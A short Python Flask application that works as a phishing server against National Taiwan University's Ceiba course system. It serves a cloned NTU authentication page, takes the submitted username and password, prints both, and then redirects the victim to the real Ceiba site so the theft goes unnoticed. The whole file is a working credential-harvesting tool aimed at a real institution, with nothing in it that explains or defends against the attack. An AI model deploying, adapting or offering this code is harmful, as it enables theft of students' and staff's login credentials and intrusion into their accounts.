import os

from flask import Flask, session, render_template, request, redirect
from flask_session import Session
from sqlalchemy import create_engine
from sqlalchemy.orm import scoped_session, sessionmaker
from flask import jsonify
import time

app = Flask(__name__)

########################################
##  setting for the objected website  ##
########################################
url = "https://ceiba.ntu.edu.tw/"
account_tag_name = "user"
password_input_name = "pass"
########################################
##                                    ##
########################################

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        username = request.form.get(account_tag_name)
        password = request.form.get(password_input_name)
        
        # validate of input
        if not username or not password:
            return redirect('/ceiba')

        print("username: {}, password: {}".format(username, password) )
        
        return redirect(url)

    else:
        return redirect('/ceiba')

@app.route('/ceiba', methods=["GET", "POST"])
def facebook():
    return render_template("臺灣大學計算機及資訊網路中心認證網頁.html")
